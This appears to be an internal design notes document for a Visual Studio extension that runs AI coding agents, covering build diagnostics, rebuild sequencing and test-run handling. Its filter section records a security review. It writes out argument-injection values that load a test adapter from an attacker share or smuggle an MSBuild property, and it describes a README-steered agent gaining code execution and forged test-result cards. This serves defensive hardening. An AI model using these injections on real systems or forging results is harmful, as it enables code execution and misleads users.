`WidenErrorListView` puts the view into the state the read needs for its duration and restores exactly what it found, in a `finally`. **A build read asks for Build ONLY, not for both** — see the re-attribution paragraph below; that is not an optimisation, it is the second half of the fix. The severity toggles (`AreErrorsShown` and friends) are genuinely display-only — changing them was observed to make no difference to what we read, so they are left alone.

**Why the mutation is acceptable, and the two invariants that make it so.** Widening the developer's Error List to answer a query would normally be out of bounds; it earns the exception because the alternative is `build_solution` reporting a clean build, `succeeded:true` and `warningCount:0`, on a solution with 28 warnings. (1) **Nothing inside the scope may yield the UI thread.** The flip is invisible only because widen → subscribe → read → restore is one synchronous block, so the dispatcher never gets a turn to repaint before the value is back. That is why the scope sits inside `ReadErrorListTable` per read rather than once around `CollectBuildDiagnosticsConvergedAsync` — fewer flips, but it would yield on every `Task.Delay` between samples. (2) **The re-publish is synchronous**: setting the property makes the rows available to a subscribe on the very next statement, which is what was measured. If a future VS dispatched that work, this read returns zero again and there is no way to wait without breaking (1). Both are written down because the symptom of either breaking is the original bug returning silently.

**And this is what finally justifies reading the sources rather than `TableControl.Entries`.** Across nine reads the two agreed exactly (`controlRows == sourceRows`, 0==0 and 28==28) — including with the window hidden, so the control survives hiding perfectly well and the original "the control shows filtered rows" diagnosis was **wrong**. The tenth read broke the tie: immediately after a programmatic flip the sources held 28 rows and the control held **0**, because the control is a long-lived subscriber updated by dispatched events while a fresh short-lived subscribe sees current state. So the reader is not redundant with the widen, it is *required* by it — reading the control there hands back the zero the widen just fixed. It is also the argument against ever making the subscription long-lived: the control IS that design, and the control is the one holding stale data. **And the `ErrorSource.Build` filter really was implicated, on a second mechanism entirely: VS RE-ATTRIBUTES.** It does not merely add live diagnostics alongside the build's — as background analysis warms up on the open files it moves diagnostics it can compute live from `Build` to `Other`. Measured on one solution with no edits between the two reads, ~50 minutes apart: `CS8602` went from 6 rows marked `Build` to 3 `Build` + 3 `Other`, `CS8604` from 3 to 2 + 1, **per-code totals preserved throughout**. Nothing was fixed; four diagnostics changed source, the filter dropped them, and a 28-warning build reported 24 — degrading further the more files are open. An earlier measurement said the filter "drops nothing it shouldn't (28 of 28 kept)" and that was **wrong**: it ran against a cold workspace, the one state that structurally cannot show this. The remedy is Roslyn's own — *flip to Build Only* — applied programmatically for the length of one read, which republishes the full build set as `Build` (verified: 28 rows, per-code breakdown identical to the cold-workspace run). The filter itself stays, because it is still what keeps stale editor rows from faking errors on a build that succeeded. The MEF route to the manager is unreliable (observed returning null, falling back to `IErrorList.TableControl.Manager`), so a null manager is **never cached**: it can be unavailable now and available later, and caching it disabled diagnostics for a whole session with no way back.

**The convergence poll must not call an EMPTY result settled too soon.** It decides settled from two consecutive identical samples, which cannot distinguish "nothing has arrived" from "nothing more is coming" — and at the start of a succeeded build two *empty* samples are identical trivially, so it returned after ~160ms having waited for nothing and reported a build's warnings as zero. An empty result now has to persist for `ErrorListEmptyFloorMs` (~1.2s); only the empty case needs it, since a non-empty set that stops changing really has settled and a *failed* build with no rows never satisfies `errorPresenceMatches` so it already polls to the deadline. That also answers the "burns the full 4s window for nothing" complaint — a genuinely clean build now costs ~1.2s. A floor rather than the publisher's own signal because there is none: `ITableDataSink.IsStable` exists for exactly this, and measured across all four sources of the errors table **none of them ever sets it** on a short-lived subscription — the value read back was only our own default, which is why it first looked like a unanimous "stable". The poll also now guarantees at least one comparison: the deadline is measured from before the first read, and a slow one could put it past the deadline before ever looking twice (observed, `samples=0`).

**The per-prompt context block carries SHAPE and PROXIMITY, not the whole set (issue #95).** It had the same defect as the tools and a worse symptom: reading through `IVsTaskList.EnumTaskItems` inherited the source dropdown, so on "IntelliSense Only" it returned nothing - and because an empty section is OMITTED rather than reported, the agent read a solution with no problems **on every prompt**, needing no tool call to be misled. It also hard-coded `Code: null`, so no row carried a `CS####`/`NU####` to act on. Now it reads the error table inside the same `ErrorListViewScope` (both halves, unlike a build read), which is why that scope moved out of `VsToolCatalog` to its own file.

**The rule the selection encodes: ambient context carries what the agent cannot get by ASKING.** It can call `get_diagnostics` for any file; it cannot know which files are open, which is active, or that a project depends on a vulnerable package. So context supplies shape and proximity, tools supply detail and completeness - a solution-wide dump is neither, while costing tokens on every turn. `Core.Ide.WorkspaceDiagnostics` decides, in Core so it is testable and **on the IDE side of the IPC boundary so a 300-warning solution never puts 300 rows on the wire**. Tiers are an ORDERING against one budget, not a cut-off - errors anywhere, then project/solution rows, then the active file, then other open files - so two warnings in closed files are still listed (nothing competes for the budget) while three hundred fill with what matters. No density threshold: that would change the block's shape for reasons the agent cannot observe. Project-level rows are identified by their **document** (`.csproj`/`.props`/`.targets`/`.sln`, or none at all), never by code prefix, so a new SDK diagnostic needs no allow-list entry; they are the strongest ambient candidates of the lot, being few, stable, impossible for IntelliSense to produce, and in no file anyone would open.

**Two rules that came from looking at the output rather than reasoning about it.** (1) The far tail is **all-or-nothing**: rendered for real, a partial `Elsewhere` tier put 20 rows of `File0.cs, File1.cs, File10.cs` - ordered by nothing but the alphabet - above the error and the active file, reading as though they had been chosen for a reason. Either they all fit in the remaining budget or the count speaks; the proximate tiers keep partial slices, where a slice IS informative (with a cascade the first errors explain the rest). (2) The floor is **Warning**: Info-tier `IDE####`/`CA####` suggestions were listed and counted as omitted while appearing in neither header total, so the block said "28 warnings" beside a list implying 32 diagnostics existed. Everything counted must be everything selected from. Both are pinned by tests, including one asserting the block does not grow with the solution - the unit tests all passed while the 20-row tail rendered, because none of them asserted the SHAPE of the output. Totals are stated always, including `Diagnostics: none`, so "no diagnostics" and "diagnostics unavailable" stop being the same observation.

**A snapshot column arrives boxed and untyped, so the SDK's conversion became ours** — `ITableEntriesSnapshot.TryGetValue` hands back an `object`, unlike the `TryGetValue<T>` available on a control handle or an `ITableEntry`. `Core.Ide.TableValue` is that coercion, in Core so it is unit-testable off the VS-bound project (the `FilePathMatch` split), and it is there *because it fails silently*: every way of getting it wrong yields a plausible answer rather than an error. A missing line becomes line 1; a mis-read `ErrorSource` excludes the row. Hence the rules the tests pin: **absent is not a number** (0 *is* `ErrorSource.Build`, so "absent" reading as 0 would admit every row with no such column), **a bool is not a number** (`Convert.ToInt32` makes it 0/1 and would do the same), boxed enums of *any* underlying integral type read, out-of-range rejects rather than wraps, and non-string columns render **invariantly** (a German UI locale must not put `1,5` in a payload the agent parses).

**A solution update's completion is an EVENT, never a state poll — and the rebuild's clean is off the UI thread because of it** (issue #250). `build_solution { rebuild: true }` ran `Clean(WaitForCleanToFinish: true)` on the UI thread: a synchronous, unbounded, recursive delete of every `bin`/`obj` in the solution, i.e. the operation AGENTS.md forbids there, and outside `BuildTimeout` because that only wrapped the poll that followed. The obvious replacement, `Clean(false)` plus the existing `BuildState == Done` poll, carries the race the old comment named: if the state has not moved to `InProgress` when the poll first reads it, the poll returns at once and **the build starts during the clean**, the compiler racing the deletion of its own inputs — silent, intermittent, wrong output. Nothing offline says whether `Clean(false)` flips the state before returning, and the build manager may legitimately DEFER an update while a solution is still loading, so no ordering of polls makes it safe. **The fix is `IVsUpdateSolutionEvents.UpdateSolution_Done` on `SVsSolutionBuildManager`** (`SolutionUpdateWaiter`), advised BEFORE `Clean` is called: a completion cannot be missed however fast the clean, and cannot arrive before the update has ended however late it began — both directions, by construction. **The issue's other candidate, "wait for a transition INTO `InProgress` and then out", was rejected for the first direction**: a clean that finishes inside one 400 ms poll interval never shows `InProgress` to a poller at all, and the wait runs to the timeout. **Two signals, and both must agree before the build starts**: the event, and then `BuildState != InProgress` read after the continuation has been posted back through the dispatcher — the event fires from inside the manager's own completion, so a build started on that stack finds it busy (`RunContinuationsAsynchronously` is what keeps the continuation off that stack). The second check waits WHILE `InProgress`, not FOR `Done` — after the event the only thing guarded is a manager still unwinding, and a state reading anything else would turn a finished clean into a ten-minute wait. **One waiter per update** — a sink advised across two would hand the first's `Done` to whoever awaited second — advised, started, awaited and unadvised in a `finally` on the UI thread. **A busy check guards the foreign-`Done` case**: with one update running at a time, a user build (or a previous tool call's still-running clean — a cancelled WAIT does not cancel the update, deliberately, matching the build phase) would have its `Done` taken as the clean's, and the solution built without ever being cleaned; so the tool refuses structured when `BuildState` is `InProgress`, checked on the same synchronous stretch of the UI thread as the start call with no yield between (the main-thread switch on the way completes synchronously, being already there), the invariant `ErrorListViewScope` rests on. **One deadline bounds the SUM** of clean and build; the wait that restarted the clock would have let a rebuild take twice the advertised bound. A timeout names which phase, and whether `UpdateSolution_Begin` was ever seen — "still deleting" and "never began" are different reports. A clean cancelled in VS (Build → Cancel) stops the tool with a structured error rather than building over a half-cleaned tree; a clean that merely FAILED (a locked output) is reported as `cleanSucceeded:false` beside the build outcome, which still decides `succeeded`. **The build phase deliberately stays on the poll**: it has been proven in Visual Studio across every session since #47, and the event's only contribution there would be to a failure that has never been observed. **The fallback when the build manager cannot be advised is the old synchronous clean** — frozen but correct, and logged to `tool-error.log` — never an unwaited clean followed by a build. **Confirmed in Visual Studio, 2026-09-09** (the IDE stays responsive; the long pause sits after VS's own "Waiting for background operations to complete..." line, which is the build manager holding the update until project-system work settles and the clean's output arriving only when it finishes — VS-side, and the interval that used to be a freeze). No offline gate can reach it, since the whole mechanism is devenv's build manager. The recipe for the next time, in a live Visual Studio instance: a solution whose clean takes seconds, `build_solution { "rebuild": true }`, the IDE stays responsive throughout (drag a window, scroll a document), the resulting build is correct across several runs (the failure mode is a race), Build → Cancel mid-clean produces the cancelled error, and a rebuild issued while the user's own build runs is refused.

**A build the USER cancelled is not a failed build, and reporting it as one sent the agent straight back into it** (measured in Visual Studio, 2026-09-09, and confirmed after the fix — the card shows `cancelled:true` and the agent does not retry). Build → Cancel mid-build left `projectsFailed:5` and ONE Error List row, MSB4242 *"SDK could not be resolved by the SDK resolver because the worker node was shut down"* — the abort itself, wearing a project path and `line:1`. With no cancellation fact in the payload the agent read it as *"a transient MSBuild node failure"* and retried the build the user had just stopped: the write-refusal shape (AGENTS.md), a result that declines to name its cause getting one supplied. **The fix is the same waiter on the build phase as a WITNESS, never as the completion signal** (`RunBuildWitnessedAsync`): the state poll proven in Visual Studio still decides when the build is over, and the already-completed event then says whether it was cancelled. The two are not ordered for us — the event fires from inside the manager's completion, the state flips around the same time — so the witness gets a 2 s grace (`WitnessGrace`) after the poll, **bounded by that and never by the build deadline**: a witness that has not reported answers *unknown*, and the build's result is still reported in full, so a missing witness can lose the cancel fact but never hang a finished build. **On a cancel the Error List is not read at all** — its rows describe the abort, not the code, and converging on them would only launder them — and the payload is `error` first (names Build → Cancel, says how many projects did not complete, says nothing about the code was decided, **and closes the retry in words**: *"Do not retry unless the user asks"*), `cancelled:true`, `succeeded:false`, `projectsFailed`, with no counts rather than zeros that would read as clean. **`cancelled` is tri-state on the normal path**: `false` when the manager reported a normal completion, omitted when nothing could witness — never a `false` asserted by something that could not see a cancel. `run_tests`' pre-run build takes the same witness and the same words, and runs no tests. The busy check moved INTO the helper, on the same no-yield terms, because on the rebuild path the clean's awaits now sit between the original check and the build's start.

**No per-project clean exists in DTE automation**, so `rebuild:true` combined with `project` still cleans the whole solution first, then rebuilds just the target project. Both **cap detailed rows (50) + emit a `countsByCode` summary** so a broken solution's hundreds of diagnostics stay loadable (a 200-error result went 65KB→16KB). The Error List is read via the **table model** (`StandardTableKeyNames`, for the `ErrorCode` column that drives the CS/BC filter) — from the table's DATA SOURCES, never the window's control (issue #93, below); **`VsWorkspaceContext` reads the same way** (issue #95), and **not through `IVsTaskList.EnumTaskItems`**: that route inherits the source dropdown (on "IntelliSense Only" it returns nothing, and the context block omits an empty section, so the agent reads a clean solution on every prompt), and `IVsErrorItem` exposes neither an error code nor `ErrorSource`, so no row can carry a CS####/NU#### and the live/build distinction is not expressible. (Issue #47: the "Roslyn only → `errorCount:0` on an MSBuild-error build that Roslyn can't see" gap is closed by the build-view union above: build-source `ErrorSource.Build` rows now join `build_solution`'s result, complete + fresh-after-build + lag-free.) **`run_tests`** runs the solution's tests **via a command-line shellout** and aggregates the TRX(es) into a structured result the chat renders as a **test-results card**. The card is **summary-first**: the pass/fail line always shows, and the failing-test list sits behind the standard chevron, auto-expanded only at or under `TestRunResultItemViewModel.InlineFailureLimit` (3) failures — a broken suite's 50 rows would otherwise bury the transcript, while a couple of failures are the detail you wanted. Expansion is transient; Copy and the markdown export always carry every failure. Each failure row exposes **two** locations: `file`/`line` = where it **threw** (the FIRST in-workspace stack frame) and `testFile`/`testLine` = where the **test** is (the LAST in-workspace frame, the outermost of the user's own frames).

**Clicking the row opens the TEST** (falling back to the throw site when there's no separate test location), matching VS's Test Explorer, where double-click opens the test and the stack-trace links reach the assertion — the throw site is often a generic assertion wrapper, and the failure *message* is already printed on the card, so the navigation is better spent on the test. Right-click offers both (test first, as the default action); the row's right-hand label follows the click target and the tooltip carries both. `Core.TestStackFrames` owns both rules (in Core so it's unit-testable against real captured traces; `VsToolCatalog` is net472 + VS-bound). The test frame is **verified, not just positional**: the TRX's `TestDefinitions/UnitTest/TestMethod@className` (mapped by `testId`) picks the last in-workspace frame that actually NAMES the declaring class, so a suite whose base class drives each test (`TestBase.Execute()` as the outermost user frame) resolves to the test rather than the base — position alone gets that one wrong. Nested classes normalize `+`→`.`; compiler-generated frames still carry the class (`MyTests.<T>d__3.MoveNext()`). An unmatched class **degrades to position rather than refusing**, because a test INHERITED from a base class reports the derived class in the TRX while the frame names the base — and that base file is genuinely where the test is. The tool omits `testFile` when it would repeat the failure location, so a non-null value always means a jump worth offering.

**Reqnroll/SpecFlow need no special-casing**: their generated code-behind carries `#line` pragmas back to the `.feature`, so the runtime attributes that outermost frame to the feature file — a failing `Then` gives the step definition as the failure and the **`.feature` scenario** as the test location (probed 2026-07-25 on Reqnroll 2.4 + xUnit; frame shape identical under VSTest and MTP), and the menu item words itself "Go to scenario" for a `.feature`. The payload's `resultKind:"testRun"` marker is serialized as the FIRST property, and the three readers that must agree on it — the ACP mapper, the shell side-channel and the view-model — share **one** literal in `Core.Ide.StructuredToolResult` (it was three copies with "keep in sync" comments). Prefix match, so recognising a payload costs no parse and output that merely quotes the marker can't false-positive into a card; reordering the serialized properties silently un-cards the run. The **shell side-channel** (`ShellRpcTarget.ToolsInvokeAsync` → `_onAgentEvent`) delivers it full-fidelity to the UI, since Kiro never echoes MCP results; the agent's echoed copy (Claude) is deduped away by the run's unique `resultsFile` and is what declutters the tool row. **A display clamp may not cut a structured payload** (issue #83): `AcpMapper` caps result text at 2000 chars for the row and the persisted log, and that cut landed mid-string with a raw `\n` after it, so every Claude-side test run threw a `JsonReaderException` on a routine path — *our* cut, not a backend transport cap, which is most of why it read as externally caused. Nothing downstream can undo a truncation, so the exemption lives in the mapper, and it is **bounded** (128 KB, against the payload's ~105 KB worst case at 50 failures × capped message/stack): past that it clamps like any other text and the card still comes from the side-channel copy, rather than letting anything wearing the marker into the log unbounded. It stayed invisible because all three mitigations worked — marker-first, the side-channel copy, and the view-model's try/catch — which is why `FakeAgentProvider` now echoes the payload WHOLE (its deliberately-cut echo meant the Desktop smoke only ever exercised the fallback) and the clean path is pinned by `TestRunPayloadClampTests`, from the mapped frame through to the card. Flow: **classify test projects in one pass, off the UI thread** (`Core.Ide.TestProjects.Classify` — the UI thread only harvests DTE state; MTP = `UseMicrosoftTestingPlatformRunner` resolved nearest-definition-wins from csproj up the `Directory.Build.props` chain, unconditional definitions only, AND a looks-like-a-test-project gate (test-framework PackageReference or `IsTestProject`) so a repo-wide props entry can't send e.g. a web app through `dotnet run`; classic = references Microsoft.NET.Test.Sdk). **The classification, the filter dialects and the two command builders live in `Core.Ide` (`TestProjectClassification` / `TestRunCommands`), not in the tool catalog, for the reason `FilePathMatch` and `TableValue` do — the catalog is net472 + the VS SDK + Roslyn and no test project can reference it, so a rule left there is a rule no test can reach, and none of this had a single test until it moved. Enumerating the solution's projects is the VS-coupled half (DTE) and stays in `CodeWicket.Ide`; deciding what the resulting paths ARE is pure, and is in Core. The behavioural record is `TestProjectClassificationTests` + `TestRunFilterTests`. **The two failure directions are not symmetric**, which is what the MTP gate is for: missing a test project reports "no test projects found" and a whole suite is silently absent, while claiming one too eagerly runs it via `dotnet run` — a misclassified web app becomes a server that never exits and the tool call hangs to its 15-minute timeout. **A project whose SDK IS a test SDK declares no test package of its own** — `MSTest.Sdk` brings the framework, the adapter and the runner with it, and the `Microsoft.NET.Test.Sdk` reference the other branches read is injected by that SDK's targets and never appears in the XML — so `TestProjectSdkNames` is a signal on its own, matched without the `/version` suffix every real project pins. **No looks-like-a-test-project gate** here, unlike the MTP property: that gate exists because the property is commonly set repo-wide, while naming a test SDK is per-project and is the strongest statement a project file makes about itself. The runner comes from **`UseVSTest`**, read out of MSTest.Sdk's own `Sdk.props`/`Sdk.targets` (default `false` → MTP; `true` → the VSTest path that adds the implicit reference), so **absence means MTP** rather than meaning nothing. It drives the dialect too, or such a project reaches `Unknown` and a structured filter fails loud against a framework that would have understood it. Found by running the classifier over a real solution, not by reading the code — the two gaps below are both about old-style projects, so every fixture written for them was old-style, and a modern project with the identical symptom sat outside everything the work was pointed at. **An old-style (non-SDK) .NET Framework project is a third kind** (`TestProjectKind.LegacyVsTest`), and the rule that gets it there is that **the runner follows project STYLE, not which test framework is referenced** — `ProjectStyle` is decided first, because a non-SDK project migrated to `PackageReference` answers `Microsoft.NET.Test.Sdk` exactly like a modern one and still cannot be run by `dotnet test`. It runs through **`vstest.console.exe` from the VS install we are inside** (no `vswhere`: it answers about every install on the machine, and a wrong-but-plausible runner is worse than none, which is at least reported), against the project's **built output assembly** — never the project file, which vstest.console accepts, exits 0 on, and writes an empty TRX for, i.e. a green card for a run that executed nothing (measured, VSTest 18.9.0). **Never `/Platform` or `/Framework`** (inferred from the PE header and `TargetFrameworkAttribute`; ours would override that with a guess, and a wrong one runs and reports normally). The assembly path is DTE (`OutputPath` + `OutputFileName`), harvested on the UI thread only when a legacy project is present, with **no csproj-XML fallback** — `OutputPath` is almost always `Condition`ed, so a fallback would be a confidently wrong path; a project whose path we cannot get rides in `notes` with `incomplete = true`. An unparseable project is **skipped, never assumed legacy**, legacy being the absence of an SDK marker. Proven live by `Console legacy-tests`. Then an **incremental VS build first** (`BuildBeforeTestRunAsync` — VS owns bin/obj so no DLL-lock race with its loaded assemblies; a build failure returns the build's own report instead of running — the same `ReadBuildReportAsync` `build_solution` reads, see #296 below), then per project: MTP via `dotnet run --no-build -- --report-trx`, classic via `dotnet test --no-build --logger trx`, each invocation bounded by the 15-min `TestRunTimeout` and **tree-killed** (`taskkill /T /F` — net472 has no `Kill(entireProcessTree)`) on timeout/cancel so orphaned test hosts can't hold build-output DLLs. A project yielding no readable TRX marks the run **incomplete** — `succeeded:false` + per-project `notes` in the payload, never a silent green card; an MTP project without the TrxReport extension gets one fallback rerun (skipped after timeout/start-failure).

**The `<Counters>` header is not the record — the results are** (issue #259). The VSTest TRX logger writes `notExecuted="0"` whatever the per-result outcomes say: measured on SDK 10 against NUnit 4 (`[Ignore]` + `Assert.Inconclusive`), xUnit v2 (`[Fact(Skip=…)]`) and MSTest 4 (`[Ignore]` + `Assert.Inconclusive`), each of which wrote `NotExecuted` results beside a zero in that field — so it is **the classic runner, not one adapter**, which is how the bug was reported (an NUnit project, whose adapter it looked like). `dotnet test`'s own console line counts them correctly and MTP's TRX writer fills the field, which is most of why the gap read as ours. A skipped test therefore counted toward `total` and landed in NO bucket — `passed + failed + skipped < total` with nothing saying why, so **a suite with ignored tests was indistinguishable from a clean one** (the report: 6 tests, `passed:4 failed:0 skipped:0`, and the two missing ones findable only by subtracting). `Core.Ide.TrxSummary` — in Core so it is unit-testable, for the reason `TestStackFrames` is — takes total/passed/failed from the header and **the LARGER of the header and the results for skipped**: the results may only fill the header's gap, never invent a test the file does not record. It then **clamps so the buckets cannot exceed the run's own total**, over-reporting being the other way for a card to fail to reconcile. Only LEAF results are counted (descending through `InnerResults`), a data-driven aggregate row repeating an outcome its rows already carry; with a header present the clamp bounds that mistake anyway, so `TrxCountsTests` pins the leaf rule on a HEADERLESS file — the one shape that can separate it from its fallback, the header-present fixture having come back `PINS NOTHING`. Read per FILE and then added, the reconciliation being meaningful only within the one run that wrote both halves. The failure-detail walk shares the same vocabulary (`TrxSummary.IsFailure`), so "failed" cannot mean one thing to the counts and another to the list.

**A count is not a report, and one file is not the results** — the two things the fixed counts then made visible. `skipped:2` says nothing about WHICH two or why, and the answer was in the TRX all along: a skipped test's reason rides the same `Output/ErrorInfo/Message` a failure's message does — the `[Ignore("…")]` text, an `Assert.Inconclusive` message, xUnit's `Skip` reason — measured on NUnit 4, xUnit v2 and MSTest 4. So `TrxSummary.ReadSkipped` names them (`skippedTests`, capped at 50 with `truncatedSkipped`, omitted entirely when none), and **a skip whose runner recorded no reason is still NAMED** — absence of a reason is not absence of the test, which is the same silence the count-only payload had, one test at a time. It shares ONE leaf walk with the counts (`LeafResults`), or a card could say "1 skipped" and name none of them. **Uncapped in Core**: the cap spans every file in the run, so it belongs to the caller. Then the file: a run writes **one TRX per project**, so the single `resultsFile` was one of N and the results NOT in it — a three-project solution's only non-passing ones, as reported — were unreachable from the payload. `resultsFiles` carries the complete per-project set; `resultsFile` stays because it is the card's **dedupe key** (unique per run, each project having its own GUID directory) and is the field every recorded conversation already holds. The card is unchanged: it still summarises "N passed · N skipped", the named list being agent-facing.

**A test's NAME is not a name** — the follow-up to the skipped list, and it was already wrong for failures. `testName` is what the runner wrote, and the runners disagree: NUnit and MSTest write a **bare method name** (`Ignored1`, `Data1(3)`), xUnit an already-qualified one (`xu.UnitTest1.Skipped1`) — measured on SDK 10. So two projects each holding a `TestMethod1` gave the same entry twice, and `filterMethod`'s own description told the agent the value it wants is "what the failing-test list shows", which on two of the three frameworks it is not. Both lists now carry **`className` and `project` beside `name`**: the class comes from `TestDefinitions` (recorded for tests that never ran too, which is what makes this answerable at all) and is read ONCE, in `TrxSummary.ClassNamesByTestId`, shared with the failure walk's test-location rule so the two cannot disagree about what a test's class is; the project comes from the caller, being the half one TRX cannot know. **Kept verbatim**: a nested class arrives as `Ns.Outer+Nested`, the spelling a VSTest `FullyQualifiedName` filter takes, so normalising it to `.` would read better and match nothing. **And the two facts are never JOINED into a `fullName`** — that is right for NUnit and MSTest, and for an xUnit `[Fact(DisplayName = "…")]`, whose result carries the display text INSTEAD of the method name and is indistinguishable from a bare one, it would compose a value that is neither the display name nor the test's own. A confidently wrong name in the one case that cannot be detected is worse than two true facts the reader joins.

**The marker says WHICH payload this is and never WHO wrote it, so a card is built from the HOST's own delivery alone.** `IsTestRun`/`IsBreakpoints` match the result text of *any* tool, so an agent whose `run_command` or MCP server merely prints `{"resultKind":"testRun"…}` earned a host-styled "N tests — all passed" card, or a breakpoint card, for a run that never happened — and that card is the artifact the user reads when deciding whether to accept the agent's changes. Provenance cannot be recovered from the bytes, so it is carried beside them: `AgentEvent.ToolCallCompleted.HostAuthored`, set at exactly one production site (`ShellRpcTarget.ToolsInvokeAsync`, the only place holding a result our own `IToolCatalog` just returned) and read by `ChatViewModel.IsHostsOwnDelivery`, which gates both card builders **ahead of the dedupe** — a refused copy must not claim a real run's `resultsFile`/`requestId` and delete the genuine card, which would be the same lie by the other route. Everything else is deliberately unchanged: the agent's echo still declutters its own tool row, and the clamp exemption still keys off `IsStructured` (a display cap may not cut DATA, whoever sent it), so **the narrowing is only the card** — a forged payload still rides the exemption past the 2000-char row cap up to 128 KB and still relabels its own row. The flag is written to the wire and the log **both ways**, not folded to null like `LaunchedInBackground` beside it, because absence is read as a DATE: a log with no flag predates it and its cards are honoured on replay (`HonourLegacyCard`), or every conversation already on disk would lose its failure list and breakpoint rows — and on Kiro, which never echoes MCP results, the whole run would vanish from the restored transcript. The residual risk is stated where the concession is made: in a pre-flag log the echo and the host's delivery are byte-identical, so a forgery already recorded there still draws. Pinned by `StructuredCardProvenanceTests`; the wire hop is pinned separately by `DtoMappingTests`, because deleting the one `DtoMapping` line that carries it left the whole suite green.

**Filters:** structured `filterMethod`/`filterClass`/`filterNamespace` translated per framework dialect (resolved during classification: xUnit v3 → `--filter-*`; classic/MSTest/NUnit → VSTest `FullyQualifiedName` expressions; unknown dialect (e.g. TUnit) fails loud and points at `run_command`) + a raw `filter` for an advanced EXPRESSION; malformed argument JSON errors rather than silently running everything. **A filter value is ONE argument and the option is ours, per dialect** (pre-release security review, September 2026). The raw escape hatch used to be *\"a verbatim, framework-native filter option string appended to that project's command\"* — i.e. it WAS command line, and an agent steered by a README could send `filter: \"--test-adapter-path \\\\attacker\\share --filter X\"` and have VSTest load an adapter assembly from there, or `-p:CustomBeforeMicrosoftCommonTargets=…` and run a targets file: code execution through a tool the permission model classifies ReadOnly, so AcceptReads approved it with no banner. The structured values were injectable too — `filterMethod: x\" --test-adapter-path \\\\evil \"` broke out of the hand-written `\"{v}\"`, and the legacy `/TestCaseFilter:\"…\"` the same way. **Three things.** First, the option name is chosen by `TestRunCommands` per dialect (VSTest → `--filter` / `/TestCaseFilter:`, xUnit v3 → `--filter-query`) and every value — raw or structured — is spelled by `Core.Ide.CommandLineArgument.Quote`, the algorithm `ProcessStartInfo.ArgumentList` applies before joining, written out because that API does not exist on net472: the child's parser (`CommandLineToArgvW` rules) reads the result back as exactly one element whatever it contains, and `CommandLineArgumentTests` proves that against the real `CommandLineToArgvW`, not against an expected string. **A backslash not before a quote passes through untouched**, which is what keeps VSTest's documented `\(`/`\)`/`\&` escapes working — the only way to filter a parameterised test by its full name — and is exactly what an earlier fix's blanket backslash ban refused. Second, what quoting cannot do: an element that is exactly `--test-adapter-path` is still that option once the quotes are stripped, so `TestRunCommands.RefuseFilterValue` refuses, before anything is spawned, a value beginning with `-` (always) or `/` (VSTest dialects, where the runner takes slash options; an xUnit v3 QUERY begins with `/` by its own grammar and keeps it), and any control character. **The old raw shape (`--filter \"…\"`) is refused with the contract spelled out, never stripped** — the agent fixes it in one retry, and a silent strip would run something other than what was asked for. The raw value now means the same thing on every runner (the legacy runner already took an expression, so the contract was inconsistent before). Unknown-dialect projects lose the raw hatch: there is no option name we can vouch for, so a filtered run of TUnit is `run_command`'s to prompt for. `run_tests` stays ReadOnly — authoring `run_tests` as Command was rejected as prompting every unfiltered run below AcceptAll for a hole that is closed structurally. **Third, a DOUBLE QUOTE is refused, because `Quote` guarantees one argument to the process we SPAWN and says nothing about the parser that process hands the value to next.** Measured against the real runner (2026-09-09, from the extension): `dotnet test` maps `--filter` onto an **MSBuild property**, so a quote inside the value ends that property early and MSBuild reads the remainder as another `name=value` of its own. Two payloads, and *the difference between them is the finding*: `x" --test-adapter-path \\attacker\share "` failed **loudly** (`MSB4177: Invalid property … contains an invalid character " "`, its injected half holding a space), while `FullyQualifiedName~CommandLineArgumentTests"CwktProbeProperty=1"` ran **the same 15 tests as the clean filter and set the property in silence**. The argv layer held in both — so the quoting fix did what it claimed — and the layer past it did not. The quiet one is the dangerous one: `CustomBeforeMicrosoftCommonTargets` is a property with no space in it, and it runs an attacker-authored targets file, which is the targets-file payload. **Refusing a quote costs nothing, which is what lets it be blanket where the backslash ban could not be**: neither dialect's grammar uses one (VSTest escapes with `\`, an xUnit query is `/Ns/Class/Method[Trait=Value]`), and a test whose display name genuinely holds a quote could not be filtered through `dotnet test` anyway, for this same reason. **Ordered after the option-prefix rule deliberately** — the old raw shape `--filter "…"` trips both, and the message worth giving is the contract, which names what to send instead. **The general rule, and the one to carry elsewhere: a value is safe only as far as the LAST parser that reads it, not the first boundary we spelled it for.** Three injections pin it (naive interpolation; no option-prefix refusal; no quote refusal), all LOAD-BEARING. **Harness note:** the live re-probe after the fix still ran, because `Ide` is loaded **in-proc in devenv** — a `build_solution` rewrites the assembly on disk while the running extension keeps the one it started with, so *an in-extension re-test of an in-proc guard proves nothing until the experimental instance is restarted*. A single solution-root `*.runsettings` is applied to classic projects (best-effort, reported in the payload notes; MTP doesn't take runsettings; VS's manually-selected runsettings is unreadable headlessly). Both source locations come from a **locale-tolerant** stack-frame regex (anchored on the path shape, not the words — .NET localizes "in …:line N" to ":Zeile"/":ligne"; it never matches on file extension, which is why a `.feature` frame is picked up like any other); `VsIdeServices.OpenFileAtLineAsync` (DTE) backs both of the card's jumps. Results land in `%LOCALAPPDATA%\code-wicket\testresults\<guid>\` (data, not temp), pruned at the next run's start.

**`run_tests` does not drive Test Explorer, deliberately.** Driving it — firing `TestExplorer.RunAllTests`, watching `IOperationState` for the run to finish, and injecting a TRX logger through an `IRunSettingsService` MEF export — works for an unfiltered classic run and nothing else, measured through the debug tee: a runsettings `TestCaseFilter` is ignored on Run-All (filters at discovery; Run-All reuses the cached full discovery), every scoped run command is `[disabled]` unless the Test Explorer window is open AND focused, and a TE-driven MTP (xUnit v3) run can never yield a TRX (`--report-trx` is CLI-only; VS server-mode never passes it) — so TE automation is whole-suite, vstest-only.

**Debug tee** `TestRunDebugLog` is **opt-in via `CWKT_TESTRUN_LOG`** (a real env var — launch env never reaches the exp instance); guard expensive messages with `TestRunDebugLog.Enabled` (the shellout logs commands, per-project exits and full output when enabled); no-op otherwise. `SubscribeWorkspaceChanged` watches `IVsSolutionEvents` + `IVsFolderWorkspaceService` so the session cwd follows solution/folder changes. All VS APIs on the UI thread via `ThreadHelper.JoinableTaskFactory`.

## Which root a relative path is measured from (`AgentPath.PreferredRoot`, issue #54)

A second, silent decision beside the canonicalization rule. **The agent's cwd first, the solution root
only as a fallback.**

`VsEditApplier` had the solution root alone, so wherever `WorkspaceRootLocator` widened past the
solution folder a relative `fs/write_text_file` resolved **a level too deep**. That failure mode is not
an error but **a DIFFERENT REAL FILE**: a write creates, so the edit reports clean while the file the
agent meant is untouched — and the read that would expose it returns the content of the file just
created.

The session reports its cwd at start, so the host pushes it down — `ChatViewModel` →
`VsIdeServices.SetAgentWorkingDirectory` → the applier — on **start, on restore and on New**.
